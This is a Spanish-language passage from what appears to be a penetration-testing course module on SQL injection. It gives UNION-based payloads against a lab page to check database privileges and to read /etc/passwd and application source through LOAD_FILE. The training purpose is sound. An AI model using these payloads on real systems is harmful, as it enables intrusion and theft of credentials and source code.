Además de recopilar datos de varias tablas y bases de datos dentro del DBMS, una SQL Injection también se puede utilizar para realizar muchas otras operaciones, como leer y escribir archivos en el servidor e incluso obtener ejecución remota de código en el servidor de back-end.

---

## Privileges

Leer datos es mucho más común que escribir datos, lo cual está estrictamente reservado para usuarios privilegiados en los DBMS modernos, ya que puede llevar a la explotación del sistema, como veremos. Por ejemplo, en `MySQL`, el usuario de la base de datos debe tener el privilegio `FILE` para cargar el contenido de un archivo en una tabla y luego volcar datos de esa tabla y leer archivos. Así que, comencemos recopilando datos sobre nuestros privilegios de usuario dentro de la base de datos para decidir si leeremos y/o escribiremos archivos en el servidor de back-end.

### DB User

Primero, debemos determinar qué usuario somos dentro de la base de datos. Aunque no necesariamente necesitamos privilegios de administrador de base de datos (DBA) para leer datos, esto se está volviendo más requerido en los DBMS modernos, ya que solo a los DBA se les otorgan tales privilegios. Lo mismo se aplica a otras bases de datos comunes. Si tenemos privilegios de DBA, entonces es mucho más probable que tengamos privilegios de lectura de archivos. Si no los tenemos, entonces debemos verificar nuestros privilegios para ver qué podemos hacer. Para poder encontrar nuestro usuario actual de la base de datos, podemos usar cualquiera de las siguientes consultas:


```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Nuestra carga útil de inyección `UNION` será la siguiente:


```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

o:

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Lo que nos dice nuestro usuario actual, que en este caso es `root`:

`http://SERVER_IP:PORT/search.php?port_code=cn`

![](https://academy.hackthebox.com/storage/modules/33/db_user.jpg)

Esto es muy prometedor, ya que un usuario root probablemente sea un DBA, lo que nos otorga muchos privilegios.

### User Privileges

Ahora que sabemos nuestro usuario, podemos comenzar a buscar qué privilegios tenemos con ese usuario. En primer lugar, podemos probar si tenemos privilegios de super administrador con la siguiente consulta:


```sql
SELECT super_priv FROM mysql.user
```

Una vez más, podemos usar la siguiente carga útil con la consulta anterior:


```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

Si tuviéramos muchos usuarios dentro del DBMS, podemos agregar `WHERE user="root"` para mostrar solo los privilegios de nuestro usuario actual `root`:


```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

`http://SERVER_IP:PORT/search.php?port_code=cn`

![](https://academy.hackthebox.com/storage/modules/33/root_privs.jpg)

La consulta devuelve `Y`, lo que significa `YES`, indicando privilegios de superusuario. También podemos volcar otros privilegios que tenemos directamente desde el esquema, con la siguiente consulta:


```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

Desde aquí, podemos agregar `WHERE grantee="'root'@'localhost'"` para mostrar solo los privilegios de nuestro usuario actual `root`. Nuestra carga útil sería:


```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Y vemos todos los posibles privilegios otorgados a nuestro usuario actual:

`http://SERVER_IP:PORT/search.php?port_code=cn`

![](https://academy.hackthebox.com/storage/modules/33/root_privs_2.jpg)

Vemos que el privilegio `FILE` está listado para nuestro usuario, permitiéndonos leer archivos e incluso potencialmente escribir archivos. Por lo tanto, podemos proceder con intentar leer archivos.

---

## LOAD_FILE

Ahora que sabemos que tenemos suficientes privilegios para leer archivos del sistema local, hagámoslo usando la función `LOAD_FILE()`. La función [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) puede ser utilizada en MariaDB / MySQL para leer datos de archivos. La función toma solo un argumento, que es el nombre del archivo. La siguiente consulta es un ejemplo de cómo leer el archivo `/etc/passwd`:


```sql
SELECT LOAD_FILE('/etc/passwd');
```

Nota: Solo podremos leer el archivo si el usuario del sistema operativo que ejecuta MySQL tiene suficientes privilegios para leerlo.

Similar a cómo hemos estado usando una inyección `UNION`, podemos usar la consulta anterior:


```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

`http://SERVER_IP:PORT/search.php?port_code=cn`

![](https://academy.hackthebox.com/storage/modules/33/load_file_sqli.png)

Pudimos leer con éxito el contenido del archivo passwd a través de la SQL injection. Desafortunadamente, esto puede ser utilizado potencialmente para filtrar el código fuente de la aplicación también.

---

## Otro Ejemplo

Sabemos que la página actual es `search.php`. El directorio raíz predeterminado de Apache es `/var/www/html`. Intentemos leer el código fuente del archivo en `/var/www/html/search.php`.


```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

`http://SERVER_IP:PORT/search.php?port_code=cn`

![](https://academy.hackthebox.com/storage/modules/33/load_file_search.png)

Sin embargo, la página termina renderizando el código HTML dentro del navegador. El código fuente HTML se puede ver presionando `[Ctrl + U]`.

![load_file_source](https://academy.hackthebox.com/storage/modules/33/load_file_source.png)

El código fuente nos muestra todo el código PHP, que podría ser inspeccionado más a fondo para encontrar información sensible como credenciales de conexión a la base de datos o encontrar más vulnerabilidades.